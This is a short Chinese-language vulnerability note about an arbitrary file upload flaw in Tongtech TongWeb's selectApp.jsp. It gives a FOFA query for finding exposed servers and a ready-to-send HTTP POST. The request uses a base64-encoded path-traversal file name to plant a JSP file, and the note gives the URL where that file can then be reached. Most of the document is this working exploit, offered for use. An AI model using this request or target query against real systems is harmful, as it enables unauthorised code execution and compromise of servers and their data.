## 东方通TongWeb-selectApp.jsp存在任意文件上传

东方通TongWeb-selectApp.jsp存在任意文件上传，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa
```javascript
header="TongWeb Server" || banner="Server: TongWeb Server"
```

## poc
```javascript
POST /heimdall/pages/cla/selectApp.jsp HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=fa2ef860e94d564632e291131d20064c
User-Agent: Mozilla/5.0 

--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="app_fileName"

Li4vLi4vYXBwbGljYXRpb25zL2hlaW1kYWxsLzEyM3F3ZTEuanNw
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="app"


--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="className"

test
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="uploadApp"; filename="test.jar"
Content-Type: application/java-archive

<% out.println(16156223+223415616); %>
--fa2ef860e94d564632e291131d20064c--
```

文件上传路径：`http://ip/heimdall/123qwe1.jsp`
